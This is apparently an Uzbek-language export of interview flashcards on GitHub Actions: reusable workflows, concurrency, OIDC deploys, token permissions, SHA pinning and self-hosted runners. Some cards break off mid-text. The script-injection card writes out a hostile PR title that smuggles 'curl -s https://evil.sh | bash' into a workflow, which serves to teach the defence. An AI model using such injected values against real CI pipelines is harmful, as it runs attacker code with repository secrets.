nomni bir run'da qayta yuklab bo'lmaydi (immutable).</li></ul><p><b>Senior nuqta:</b> Cache hit ratio va restore vaqtini kuzat — ba'zan katta cache'ni yuklash noldan build'dan sekinroq.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32007	<p>Reusable workflow va composite action farqi?</p>	<p><b>Qisqa javob:</b> Reusable workflow — butun job(lar)ni qayta ishlatish: o'z <code>runs-on</code>, environment, secret'lari bilan, chaqiruvchi uni <code>jobs.&lt;id&gt;.uses</code> orqali chaqiradi. Composite action — bir nechta step'ni bitta step sifatida qayta ishlatish: chaqiruvchi job ichida, uning runner'i va workspace'ida ishlaydi.</p><p><b>Farq:</b></p><pre>Reusable workflow (job darajasi):<br>  caller.yml<br>    jobs:<br>      ci: uses: org/shared/.github/workflows/go-ci.yml@v1<br>          -&gt; o'z runner'lari, o'z job'lari (lint, test, scan)<br><br>Composite action (step darajasi):<br>  caller.yml<br>    steps:<br>      - uses: org/actions/setup-go-env@v1<br>          -&gt; shu job ichida: setup-go + cache + private modul auth</pre><p>| | Reusable workflow | Composite action | |---|---|---| | Daraja | job | step | | Fayl | <code>.github/workflows/x.yml</code> + <code>on: workflow_call</code> | <code>action.yml</code> + <code>runs.using: composite</code> | | Runner | o'zi tanlaydi | chaqiruvchiniki | | Secret | <code>secrets:</code> yoki <code>inherit</code> | input sifatida | | Environment/approval | ha | yo'q | | Nesting | 4 daraja (yangi limit 10) | ichida boshqa action'lar |</p><p><b>Amalda:</b></p><pre># shared/.github/workflows/go-ci.yml<br>on:<br>  workflow_call:<br>    inputs: {go: {type: string, default: '1.23'}}<br>    secrets: {SONAR_TOKEN: {required: false}}<br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: {go-version: '${{ inputs.go }}'}<br>      - run: go test -race ./...</pre><pre># chaqiruvchi<br>jobs:<br>  ci:<br>    uses: org/shared/.github/workflows/go-ci.yml@v1<br>    with: {go: '1.23'}<br>    secrets: inherit</pre><p>Composite:</p><pre># action.yml<br>runs:<br>  using: composite<br>  steps:<br>    - uses: actions/setup-go@v5<br>      with: {go-version-file: go.mod}<br>    - run: git config --global url.&quot;https://x:${{ inputs.token }}@github.com/&quot;.insteadOf &quot;https://github.com/&quot;<br>      shell: bash</pre><p><b>Tuzoqlar:</b></p><ul><li>Composite'da har <code>run:</code> ga <code>shell:</code> majburiy.</li><li><code>secrets: inherit</code> — hamma secret'larni beradi; tashqi workflow uchun aniq ro'yxat yaxshiroq.</li><li><code>@main</code> ga murojaat — shared o'zgarishi hamma repo'ni bir zumda buzadi; versiya tag yoki SHA.</li></ul><p><b>Senior nuqta:</b> Qoida: platforma standarti (lint + test + scan + build) — reusable workflow (approval va izolyatsiya bilan); kichik takrorlanuvchi qadam — composite action.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32008	<p>Environment va protection rule nima beradi?</p>	<p><b>Qisqa javob:</b> Environment — deploy maqsadi (staging, production) uchun GitHub obyekti: o'z secret va variable'lari, protection rule'lari (required reviewers, wait timer, faqat ma'lum branch/tag'dan deploy) va deploy tarixi. Interview Drill::CI/CD::I8 GitHub Actions	idrill-32009	<p><code>concurrency</code> kaliti nima uchun?</p>	<p><b>Qisqa javob:</b> <code>concurrency</code> bir xil guruhdagi workflow yoki job'lar bir vaqtda faqat bittadan ishlashini ta'minlaydi. Yangi run kelganda: <code>cancel-in-progress: true</code> bo'lsa ishlayotganini bekor qiladi, <code>false</code> bo'lsa navbatda kutadi (navbatda faqat oxirgi bitta qoladi, oradagilar bekor qilinadi).</p><p><b>Qanday ishlaydi:</b></p><pre>group: ci-refs/heads/feature-x<br> push 1 -&gt; run A ishlayapti<br> push 2 -&gt; cancel-in-progress: true  -&gt; A bekor, B boshlanadi<br>           cancel-in-progress: false -&gt; B kutadi (pending)<br> push 3 -&gt; false bo'lsa: B bekor (pending'dan chiqariladi), C kutadi</pre><p><b>Amalda:</b></p><pre># PR CI: eski commit testlarini bekor qilib, daqiqa tejash<br>concurrency:<br>  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}<br>  cancel-in-progress: true</pre><pre># Production deploy: yarim deploy bekor qilinmasin<br>jobs:<br>  deploy:<br>    environment: production<br>    concurrency:<br>      group: deploy-production<br>      cancel-in-progress: false</pre><p>Dinamik: <code>cancel-in-progress: ${{ github.event_name == 'pull_request' }}</code>.</p><p><b>Qachon nima:</b></p><p>| Holat | <code>cancel-in-progress</code> | |---|---| | PR testlari | <code>true</code> — faqat oxirgi commit muhim | | main'ga deploy | <code>false</code> — navbat, yarim deploy xavfli | | Terraform apply | <code>false</code> — state lock to'qnashuvi bo'lmasin |</p><p><b>Tuzoqlar:</b></p><ul><li>Guruh kaliti juda keng (<code>group: ci</code>) — barcha branch'lar bir-birini bekor qiladi/bloklaydi.</li><li><code>false</code> bilan ham oradagi pending run'lar tashlanadi — har commit deploy bo'lishi kafolatlanmaydi (odatda bu yaxshi, lekin bilish kerak).</li><li><code>cancel-in-progress: true</code> deploy uchun — Kubernetes yoki migratsiya yarim holatda qoladi.</li></ul><p><b>Senior nuqta:</b> Deploy uchun concurrency — environment darajasidagi mutex; uni Terraform lock yoki Argo sync kabi pastki qatlam lock'lari bilan birga ishlat.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33027	<p>Job output'lari job'lar orasida qanday uzatiladi?</p>	<p><b>Qisqa javob:</b> Job output'ini e'lon qilish uchun job darajasida <code>outputs:</code> yoziladi (odatda step output'iga havola), keyingi job <code>needs:</code> orqali bog'lanib <code>${{ needs.&lt;job&gt;.outputs.&lt;name&gt; }}</code> bilan o'qiydi. Kichik qiymatlar (tag, versiya, JSON ro'yxat) uchun; fayllar — artifact orqali.</p><p><b>Qanday ishlaydi:</b></p><pre>build job:<br>  step meta -&gt; echo &quot;image=...&quot; &gt;&gt; $GITHUB_OUTPUT<br>  outputs.image = steps.meta.outputs.image<br>       |<br>       v  (needs: build)<br>deploy job:<br>  ${{ needs.build.outputs.image }}</pre><p><b>Amalda:</b></p><pre>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    outputs:<br>      image: ${{ steps.meta.outputs.image }}<br>      digest: ${{ steps.push.outputs.digest }}<br>    steps:<br>      - id: meta<br>        run: echo &quot;image=ghcr.io/org/app:${GITHUB_SHA}&quot; Interview Drill::CI/CD::I8 GitHub Actions	idrill-33028	<p>Dinamik matrix (<code>fromJSON</code>) va monorepo'da faqat o'zgargan servisni build qilish?</p>	<p><b>Qisqa javob:</b> Avval &quot;changes&quot; job'i qaysi servis papkalari o'zgarganini aniqlaydi (masalan <code>dorny/paths-filter</code>) va ro'yxatni JSON output qiladi; keyingi job <code>strategy.matrix</code> ni <code>fromJSON()</code> bilan shu ro'yxatdan quradi. Natija — faqat o'zgargan servislar build/test qilinadi. Bo'sh ro'yxatni <code>if:</code> bilan himoya qilish shart.</p><p><b>Oqim:</b></p><pre>PR: services/billing/** va services/auth/** o'zgardi<br>changes job -&gt; [&quot;billing&quot;,&quot;auth&quot;]<br>build job matrix -&gt; build(billing), build(auth)   (payments yo'q)</pre><p><b>Amalda:</b></p><pre>jobs:<br>  changes:<br>    runs-on: ubuntu-latest<br>    outputs:<br>      svcs: ${{ steps.f.outputs.changes }}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: dorny/paths-filter@v3<br>        id: f<br>        with:<br>          filters: |<br>            billing:<br>              - 'services/billing/**'<br>              - 'pkg/**'<br>            auth:<br>              - 'services/auth/**'<br>              - 'pkg/**'<br>  build:<br>    needs: changes<br>    if: needs.changes.outputs.svcs != '[]'<br>    runs-on: ubuntu-latest<br>    strategy:<br>      fail-fast: false<br>      matrix:<br>        svc: ${{ fromJSON(needs.changes.outputs.svcs) }}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - run: make -C services/${{ matrix.svc }} test build<br>  ci-ok:                              # branch protection uchun yagona required check<br>    needs: [changes, build]<br>    if: always()<br>    runs-on: ubuntu-latest<br>    steps:<br>      - run: |<br>          [[ &quot;${{ needs.build.result }}&quot; =~ ^(success|skipped)$ ]] || exit 1</pre><p><b>Tuzoqlar:</b></p><ul><li>Umumiy kod (<code>pkg/</code>, <code>go.mod</code>, CI fayllari) o'zgarganda hammasi build bo'lishi kerak — filter'ga qo'sh.</li><li>Bo'sh matrix — &quot;Matrix vector does not contain any values&quot; xatosi; <code>if:</code> bilan.</li><li>Required check sifatida <code>build (billing)</code> qo'yilsa — billing o'zgarmagan PR merge bo'lmaydi. Interview Drill::CI/CD::I8 GitHub Actions	idrill-33029	<p><code>workflow_run</code> va <code>workflow_dispatch</code>/<code>repository_dispatch</code> qachon ishlatiladi?</p>	<p><b>Qisqa javob:</b> <code>workflow_run</code> — boshqa workflow tugaganda ishga tushadi (masalan CI muvaffaqiyatli bo'lgach deploy); u default branch kontekstida va secret'lar bilan ishlaydi. <code>workflow_dispatch</code> — qo'lda yoki API/CLI orqali input'lar bilan ishga tushirish (deploy, rollback). <code>repository_dispatch</code> — tashqi tizim (boshqa repo, webhook) API orqali custom event yuboradi.</p><p><b>Qachon qaysi:</b></p><p>| Event | Kim boshlaydi | Misol | |---|---|---| | <code>workflow_run</code> | boshqa workflow tugashi | CI -&gt; deploy; fork PR natijasiga comment | | <code>workflow_dispatch</code> | odam (UI, <code>gh</code>), API | &quot;Deploy to prod&quot; tugmasi, rollback | | <code>repository_dispatch</code> | tashqi tizim API | boshqa repo'dagi release -&gt; bu repo'da update |</p><p><b>Amalda:</b></p><pre># deploy.yml<br>on:<br>  workflow_run:<br>    workflows: [CI]<br>    types: [completed]<br>    branches: [main]<br>jobs:<br>  deploy:<br>    if: github.event.workflow_run.conclusion == 'success'<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>        with: {ref: '${{ github.event.workflow_run.head_sha }}'}</pre><pre>gh workflow run deploy.yml -f env=prod -f version=v1.4.2<br>curl -X POST -H &quot;Authorization: Bearer $TOKEN&quot; \<br>  https://api.github.com/repos/org/app/dispatches \<br>  -d '{&quot;event_type&quot;:&quot;lib-released&quot;,&quot;client_payload&quot;:{&quot;version&quot;:&quot;2.1.0&quot;}}'</pre><p><b>Xavfsizlik (<code>workflow_run</code>):</b> fork PR'dan kelgan CI'ning artifact'lari hujumchi nazoratida. <code>workflow_run</code> esa secret'lar va yozish huquqi bilan ishlaydi. Shuning uchun:</p><ul><li>artifact'ni faqat <b>ma'lumot</b> sifatida o'qi (masalan, test natijasi JSON), uni ishga tushirma;</li><li>PR raqami, branch nomi kabi qiymatlarni shell'ga to'g'ridan-to'g'ri qo'yma (injection).</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>workflow_run</code> faqat default branch'dagi workflow faylidan ishlaydi — feature branch'da sinab bo'lmaydi.</li><li><code>head_sha</code> ni ko'rsatmasdan checkout — boshqa commit deploy bo'ladi.</li><li>Zanjir chuqurligi 3 dan oshmaydi.</li></ul><p><b>Senior nuqta:</b> Ko'p hollarda <code>needs</code> bilan bitta workflow sodda va ishonchliroq; <code>workflow_run</code> ni ishonch chegarasini ajratish (untrusted CI -&gt; trusted post-process) uchun ishlat.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33030	<p>Release/tag asosidagi deploy pipeline qanday quriladi?</p>	<p><b>Qisqa javob:</b> Tag (<code>v1.2.3</code>) push qilinganda ishga tushadigan workflow: to'liq tarix bilan checkout, bir marta build (binary/image), release yaratish (changelog bilan), artifact'larni nashr qilish va keyin xuddi shu artifact'ni staging, so'ng approval bilan prod'ga deploy qilish. Tag yaratish huquqi ruleset bilan cheklanadi.</p><p><b>Oqim:</b></p><pre>git tag v1.4.0 &amp;&amp; git push --tags<br>   |<br>   v<br>release workflow:<br>  build (bir marta) -&gt; image@sha256:abc + binary'lar + checksum<br>  GitHub Release + changelog<br>  attest provenance<br>   |<br>   v<br>deploy-stg (avtomatik) -&gt; smoke test -&gt; deploy-prod (environment approval)<br>   (ikkalasi ham aynan sha256:abc)</pre><p><b>Amalda:</b></p><pre>on:<br>  push:<br>    tags: ['v*.*.*']<br>permissions:<br>  contents: write<br>  packages: write<br>  id-token: write<br>  attestations: write<br>jobs:<br>  release:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>        with: {fetch-depth: 0}        # changelog va git describe uchun<br>      - uses: actions/setup-go@v5<br>        with: {go-version-file: go.mod}<br>      - uses: goreleaser/goreleaser-action@v6<br>        with: {args: release --clean}<br>        env:<br>          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}</pre><p>Release yaratish qo'lda: <code>gh release create v1.4.0 --generate-notes dist/*</code>.</p><p><b>Muhim tamoyillar:</b></p><ul><li><b>Build once, deploy many:</b> staging va prod uchun qayta build yo'q — test qilingan artifact aynan prod'ga boradi.</li><li>Versiya tag'dan olinadi (<code>${GITHUB_REF_NAME}</code>), qo'lda yozilmaydi.</li><li>Tag ruleset: faqat release manager yoki bot <code>v*</code> tag yarata oladi, tag o'chirish/ko'chirish taqiqlangan.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>fetch-depth: 1</code> (default) — <code>git describe</code> va changelog ishlamaydi.</li><li>Tag main'dan emas, tasodifiy branch'dan qo'yilgan — tekshirilmagan kod release bo'ladi; workflow'da tag commit main'da ekanini tekshir.</li><li><code>GITHUB_TOKEN</code> bilan yaratilgan release boshqa workflow'larni trigger qilmaydi.</li></ul><p><b>Senior nuqta:</b> Release Please yoki semantic-release kabi vositalar conventional commit'lardan versiya va changelog'ni avtomatik chiqaradi — odam qo'lda tag qo'yish xatosini kamaytiradi.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33031	<p><code>continue-on-error</code>, <code>timeout-minutes</code> va retry qanday sozlanadi?</p>	<p><b>Qisqa javob:</b> <code>timeout-minutes</code> — job yoki step uchun maksimal vaqt (default 360 daqiqa — osilgan job 6 soat daqiqa yeydi). <code>continue-on-error</code> — step/job fail bo'lsa ham workflow muvaffaqiyatli hisoblanadi (eksperimental matrix kombinatsiyalari uchun). Retry — GitHub'da o'rnatilgan emas: action (<code>nick-fields/retry</code>) yoki shell loop bilan, faqat tarmoq/infra operatsiyalari uchun.</p><p><b>Amalda:</b></p><pre>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    timeout-minutes: 15<br>    strategy:<br>      fail-fast: false<br>      matrix:<br>        go: ['1.23', '1.24']<br>        experimental: [false]<br>        include:<br>          - {go: 'tip', experimental: true}<br>    continue-on-error: ${{ matrix.experimental }}<br>    steps:<br>      - uses: actions/checkout@v4<br>      - name: Dependency yuklash (tarmoq - retry mumkin)<br>        uses: nick-fields/retry@v3<br>        with:<br>          max_attempts: 3<br>          timeout_minutes: 5<br>          retry_wait_seconds: 10<br>          command: go mod download<br>      - name: Test<br>        timeout-minutes: 10<br>        run: go test ./...</pre><p>Shell'da oddiy retry:</p><pre>for i in 1 2 3; do curl -fsS &quot;$URL&quot; -o file &amp;&amp; break; sleep $((i*5)); done</pre><p><b>Qachon nima:</b></p><p>| Vosita | Ishlat | Ishlatma | |---|---|---| | <code>timeout-minutes</code> | har job'da | — | | <code>continue-on-error</code> | eksperimental versiya, ixtiyoriy skan | asosiy testlar | | retry | <code>apt</code>, <code>go mod download</code>, registry push | unit/e2e testlar |</p><p><b>Tuzoqlar:</b></p><ul><li>Testlarga retry — flaky testni yashiradi va haqiqiy race bug'ni prod'ga o'tkazadi.</li><li><code>continue-on-error: true</code> asosiy job'da — qizil bo'lishi kerak bo'lgan pipeline yashil ko'rinadi.</li><li><code>timeout-minutes</code> yo'q — osilgan integration test 6 soat runner yeydi.</li><li>UI'da &quot;Re-run failed jobs&quot; ni odat qilish — flaky muammo hech qachon tuzatilmaydi.</li></ul><p><b>Senior nuqta:</b> Job vaqtlarini kuzat va <code>timeout-minutes</code> ni p95 x 2 atrofida qo'y. Retry qilingan operatsiyalar sonini metrika sifatida yig' — u infra muammolarini oldindan ko'rsatadi.</p>	lvl::Middle dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32010	<p><code>pull_request_target</code> nega xavfli?</p>	<p><b>Qisqa javob:</b> <code>pull_request_target</code> workflow'ni base branch (masalan <code>main</code>) kontekstida ishga tushiradi: secret'lar mavjud va <code>GITHUB_TOKEN</code> yozish huquqiga ega — hatto PR fork'dan kelgan bo'lsa ham. Agar shu workflow PR'ning kodini checkout qilib ishga tushirsa (<code>make test</code>, <code>npm install</code>), hujumchi o'z kodini secret'lar bilan bajaradi — &quot;pwn request&quot; hujumi.</p><p><b>Farq:</b></p><pre>pull_request (fork'dan):<br>  kod: PR kodi, secret: YO'Q, token: read-only     -&gt; xavfsiz<br><br>pull_request_target:<br>  workflow fayli: main'dan (hujumchi o'zgartira olmaydi)<br>  secret: BOR, token: write<br>  checkout default: main kodi  -&gt; xavfsiz<br>  checkout head.sha: PR kodi   -&gt; secret'ni tashqi serverga yuboradi yoki main'ga push qiladi.</p><p><b>Xavfsiz yechimlar:</b></p><ol><li>Untrusted kodni oddiy <code>pull_request</code> da ishlat (secret'siz).</li><li>Secret kerak bo'lgan qism (PR'ga comment, label) — <code>workflow_run</code> da, PR natijasini faqat <b>ma'lumot</b> sifatida o'qib.</li><li><code>pull_request_target</code> faqat metadata ishi uchun (label qo'yish, PR'ni triage) — PR kodini checkout qilmasdan.</li><li>Majbur bo'lsa — maintainer <code>safe-to-test</code> label qo'ygandan keyin, va label har yangi push'da olib tashlanadi.</li></ol><p><b>Tuzoqlar:</b></p><ul><li>&quot;Fork PR'larda secret yo'q, testlar fail&quot; Interview Drill::CI/CD::I8 GitHub Actions	idrill-32011	<p>Script injection (<code>${{ github.event... }}</code> in <code>run</code>) qanday yuz beradi?</p>	<p><b>Qisqa javob:</b> <code>${{ }}</code> ifodalari shell ishga tushishidan <b>oldin</b> matn sifatida skriptga almashtiriladi. Agar ichida hujumchi nazoratidagi qiymat (PR title, branch nomi, commit xabari, issue comment) bo'lsa, u shell buyrug'iga aylanadi. Qo'shtirnoq himoya qilmaydi. Yechim: qiymatni <code>env:</code> orqali o'zgaruvchi sifatida berish va shell'da <code>&quot;$VAR&quot;</code> bilan ishlatish.</p><p><b>Qanday yuz beradi:</b></p><pre>- run: echo &quot;PR: ${{ github.event.pull_request.title }}&quot;</pre><p>Hujumchi PR title'ini shunday qo'yadi:</p><pre>x&quot;; curl -s https://evil.sh | bash; echo &quot;</pre><p>Runner bajaradigan skript:</p><pre>echo &quot;PR: x&quot;; curl -s https://evil.sh | bash; echo &quot;&quot;</pre><p>-&gt; hujumchi kodi runner'da, token va secret'lar bilan.</p><p><b>To'g'ri usul:</b></p><pre>- run: echo &quot;PR: $TITLE&quot;<br>  env:<br>    TITLE: ${{ github.event.pull_request.title }}</pre><p>Endi qiymat ma'lumot sifatida o'zgaruvchiga tushadi, shell uni buyruq deb parse qilmaydi.</p><p><b>Untrusted manbalar:</b></p><ul><li><code>github.event.pull_request.title</code>, <code>.body</code>, <code>.head.ref</code> (branch nomi)</li><li><code>github.event.issue.title/body</code>, <code>github.event.comment.body</code></li><li><code>github.event.head_commit.message</code>, <code>.author.email</code></li><li><code>github.head_ref</code></li><li><code>workflow_run</code> dagi artifact mazmuni</li></ul><p><b>Boshqa joylar:</b> <code>actions/github-script</code> ichidagi <code>script:</code> ham xuddi shunday (JS injection) — <code>process.env</code> orqali o'qi. <code>GITHUB_ENV</code> ga untrusted qiymat yozish ham xavfli.</p><p><b>Tekshirish:</b></p><pre>zizmor .github/workflows/        # xavfsizlik linteri<br>actionlint                        # sintaksis + injection ogohlantirishlari</pre><p><b>Tuzoqlar:</b></p><ul><li>&quot;Faqat <code>echo</code> qilyapman&quot; — <code>echo</code> ham shell, injection baribir ishlaydi.</li><li>Composite action ichida <code>${{ inputs.x }}</code> ni <code>run:</code> ga qo'yish — chaqiruvchi untrusted qiymat bersa xuddi shu.</li><li>Faqat <code>pull_request_target</code> xavfli deb o'ylash — <code>issue_comment</code>, <code>issues</code> event'lari ham secret bilan ishlaydi.</li></ul><p><b>Senior nuqta:</b> Qoida oddiy: <code>run:</code> va <code>script:</code> ichida <code>${{ github.event.* }}</code> umuman bo'lmasin. Buni linter bilan majburla.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32012	<p>OIDC bilan cloud'ga secretsiz deploy qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> GitHub Actions har job uchun qisqa muddatli OIDC token (JWT) chiqaradi; unda repo, branch, environment kabi claim'lar bor. Cloud (AWS/GCP/Azure) bu tokenni ishonchli identity provider sifatida qabul qiladi va trust policy shartlari mos kelsa, vaqtinchalik credential beradi. Natija: repo'da uzoq yashovchi cloud kaliti yo'q.</p><p><b>Qanday ishlaydi:</b></p><pre>Job (permissions: id-token: write)<br>  -&gt; GitHub OIDC: JWT {iss: token.actions.githubusercontent.com,<br>                       sub: repo:org/app:environment:production,<br>                       aud: sts.amazonaws.com}<br>  -&gt; AWS STS AssumeRoleWithWebIdentity(JWT, role)<br>       trust policy: sub mos keladimi?<br>  -&gt; vaqtinchalik credential (~1 soat)<br>  -&gt; aws ecs update-service ...</pre><p><b>Amalda (workflow):</b></p><pre>permissions:<br>  id-token: write<br>  contents: read<br>jobs:<br>  deploy:<br>    environment: production<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: aws-actions/configure-aws-credentials@v4<br>        with:<br>          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod<br>          aws-region: eu-central-1<br>      - run: aws sts get-caller-identity</pre><p><b>AWS trust policy:</b></p><pre>{&quot;Effect&quot;:&quot;Allow&quot;,<br> &quot;Principal&quot;:{&quot;Federated&quot;:&quot;arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com&quot;},<br> &quot;Action&quot;:&quot;sts:AssumeRoleWithWebIdentity&quot;,<br> &quot;Condition&quot;:{<br>   &quot;StringEquals&quot;:{<br>     &quot;token.actions.githubusercontent.com:aud&quot;:&quot;sts.amazonaws.com&quot;,<br>     &quot;token.actions.githubusercontent.com:sub&quot;:&quot;repo:org/app:environment:production&quot;}}}</pre><p><b>Foyda:</b> rotatsiya kerak emas, sizsa ham ~1 soatda yaroqsiz, har deploy CloudTrail'da aniq repo/workflow bilan.</p><p><b>Tuzoqlar:</b></p><ul><li><code>sub</code> sharti juda keng (<code>repo:org/*</code> yoki <code>StringLike</code> bilan <code>*</code>) — har qanday repo/branch, hatto PR, prod rolini oladi.</li><li><code>sub</code> shartisiz faqat <code>aud</code> — har qanday GitHub repo (boshqa tashkilotlar ham!) rolni oladi.</li><li><code>permissions: id-token: write</code> ni workflow darajasida hamma job'ga berish.</li></ul><p><b>Senior nuqta:</b> <code>sub</code> ni environment'ga bog'la (<code>environment:production</code>) — shunda environment protection rule (approval, branch) cloud kirishining ham shartiga aylanadi. Prod va stg uchun alohida rollar.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32013	<p><code>GITHUB_TOKEN</code> permission'larini qanday cheklaysiz va nega?</p>	<p><b>Qisqa javob:</b> <code>GITHUB_TOKEN</code> — har run uchun avtomatik yaratiladigan token; uning huquqlarini <code>permissions:</code> kaliti bilan workflow va job darajasida aniq belgilash kerak. Sabab — least privilege: biror step (masalan, buzilgan third-party action) tokenni o'g'irlasa, run davomida u bilan repo'ga push, release o'chirish yoki package yozish mumkin.</p><p><b>Amalda:</b></p><pre>permissions: {}                 # workflow default: hech narsa<br><br>jobs:<br>  test:<br>    runs-on: ubuntu-latest<br>    permissions:<br>      contents: read            # faqat checkout<br>    steps: [...]<br><br>  release:<br>    runs-on: ubuntu-latest<br>    permissions:<br>      contents: write           # release yaratish<br>      packages: write           # GHCR push<br>      id-token: write           # OIDC<br>    steps: [...]</pre><p>Org/repo sozlamasi: Settings -&gt; Actions -&gt; Workflow permissions -&gt; <b>Read repository contents</b> (default read-only) qil.</p><p><b>Asosiy scope'lar:</b></p><p>| Scope | Nima uchun | |---|---| | <code>contents</code> | kod o'qish/push, release | | <code>pull-requests</code> | PR comment, label | | <code>packages</code> | GHCR | | <code>id-token</code> | OIDC cloud kirish | | <code>checks</code>, <code>statuses</code> | check natijalari | | <code>security-events</code> | code scanning (SARIF) yuklash |</p><p><b>Xususiyatlari:</b></p><ul><li>Token run tugagach yaroqsiz bo'ladi (max 24 soat).</li><li><code>GITHUB_TOKEN</code> bilan qilingan push/PR yangi workflow'ni trigger qilmaydi (cheksiz rekursiyadan himoya). Kerak bo'lsa — GitHub App installation tokeni (<code>actions/create-github-app-token</code>).</li><li><code>permissions</code> yozilganda ko'rsatilmagan scope'lar <code>none</code> bo'ladi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Eski repo'larda default <code>write-all</code> — har job hamma narsaga yoza oladi.</li><li>PAT (personal access token) ishlatish — odamga bog'langan, uzoq muddatli, keng huquqli; u ketsa pipeline buziladi.</li><li><code>actions/checkout</code> token'ni <code>.git/config</code> ga saqlaydi — keyingi untrusted step uni o'qiydi; kerak bo'lmasa <code>persist-credentials: false</code>.</li></ul><p><b>Senior nuqta:</b> Tashkilot darajasida default read-only, har workflow <code>permissions: {}</code> bilan boshlanib, job'larga kerakli minimal scope. Buni <code>zizmor</code>/OpenSSF Scorecard bilan tekshir.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-32014	<p>Third-party action'larni nega SHA bilan pin qilish kerak?</p>	<p><b>Qisqa javob:</b> Tag (<code>@v4</code>) o'zgaruvchan: action muallifi yoki uning akkauntini buzgan hujumchi tag'ni boshqa commit'ga ko'chirishi mumkin — sening workflow'ing keyingi run'da zararli kodni secret'lar bilan bajaradi. Commit SHA (40 belgi) o'zgarmas — aynan review qilingan kod ishlaydi.</p><p><b>Real misol:</b> 2025-yil martda <code>tj-actions/changed-files</code> buzildi: hujumchi barcha versiya tag'larini zararli commit'ga ko'chirdi, u runner xotirasidan secret'larni log'ga chiqardi. 23 000+ repo ta'sirlandi; SHA bilan pin qilganlar zarar ko'rmadi.</p><p><b>Amalda:</b></p><pre># YOMON: tag ko'chirilishi mumkin<br>- uses: tj-actions/changed-files@v45<br><br># YAXSHI: o'zgarmas SHA + izohda versiya<br>- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2</pre><p>SHA'ni topish:</p><pre>gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq .object.sha</pre><p>Avtomatik yangilash (Dependabot SHA'ni ham yangilaydi va izohdagi versiyani o'zgartiradi):</p><pre># .github/dependabot.yml<br>version: 2<br>updates:<br>  - package-ecosystem: github-actions<br>    directory: /<br>    schedule: {interval: weekly}</pre><p>Mavjud workflow'larni pin qilish: <code>pinact run</code> yoki <code>ratchet pin</code>.</p><p><b>Qo'shimcha himoya qatlamlari:</b></p><ul><li>Org policy: faqat allowlist action'lar (GitHub-verified + tanlanganlar); 2025 dan GitHub policy'da SHA pin'ni majburlash ham mumkin.</li><li><code>step-security/harden-runner</code> — runner'dan chiqadigan tarmoq trafigini kuzatish/bloklash.</li><li>Minimal <code>permissions</code> — action buzilsa ham zarar cheklangan.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>SHA pin, lekin action ichida o'zi <code>@main</code> dagi boshqa action'ni yoki <code>curl | bash</code> ni chaqiradi — tranzitiv xavf qoladi.</li><li>Fork'dagi SHA: hujumchi fork'idagi commit SHA'si ham asl repo nomi orqali ishlashi mumkin — SHA tag'ga mosligini tekshir.</li><li>Pin qilib yangilamaslik — xavfsizlik tuzatishlari kelmaydi.</li></ul><p><b>Senior nuqta:</b> Action — dependency, va u job'ning barcha secret va token'iga kirish oladi. Unga kod kutubxonasi kabi munosabatda bo'l: pin, review, avtomatik yangilash, minimal huquq.</p>	lvl::Senior dom::cicd sec::i8 GitHub_Actions
Interview Drill::CI/CD::I8 GitHub Actions	idrill-33032	<p>Self-hosted runner'larni K8s'da (ARC) qanday ishlatasiz?</p>	<p><b>Qisqa javob:</b> Actions Runner Controller (ARC) — Kubernetes operator'i: GitHub'dagi navbatga qarab runner pod'larini avtomatik yaratadi va o'chiradi (runner scale set). Har job yangi, ephemeral pod'da ishlaydi va tugagach o'chadi — state va secret keyingi job'ga qolmaydi. Workflow'da <code>runs-on: &lt;scale-set-nomi&gt;</code>.</p><p><b>Arxitektura:</b></p><pre>GitHub navbat (job kutmoqda)<br>     |<br>     v<br>ARC controller + listener (namespace arc-systems)<br>     | ephemeral runner pod yarat<br>     v<br>arc-runners namespace:  [runner pod job#1] [runner pod job#2]<br>     job tugadi -&gt; pod o'chadi; minRunners..maxRunners oralig'ida autoscale</pre><p><b>Amalda:</b></p><pre>helm install arc --namespace arc-systems --create-namespace \<br>  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller<br>helm install arc-runner-set --namespace arc-runners --create-namespace \<br>  --set githubConfigUrl=&quot;https://github.com/acme&quot; \<br>  --set githubConfigSecret=gh-app-secret \<br>  --set minRunners=0 --set maxRunners=50 \<br>  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set</pre><pre>jobs:<br>  build:<br>    runs-on: arc-runner-set</pre><p><b>Production uchun qarorlar:</b></p><ul><li><b>Auth:</b> PAT emas, GitHub 